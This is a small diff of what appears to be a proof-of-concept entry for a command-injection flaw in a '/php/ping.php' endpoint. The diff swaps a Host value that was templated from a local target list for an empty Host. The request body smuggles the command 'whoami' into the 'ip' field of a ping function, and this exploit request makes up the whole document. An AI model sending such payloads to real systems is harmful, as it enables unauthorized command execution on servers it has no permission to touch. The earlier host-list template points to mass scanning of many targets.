@@ -78,7 +78,7 @@ http:
 
 ```http
 POST /php/ping.php HTTP/1.1
-Host: {{file:line(C:\Users\16935\Desktop\list.txt)}}
+Host: 
 Content-Type: application/x-www-form-urlencoded
 
 jsondata%5Btype%5D=3&jsondata%5Bip%5D=whoami
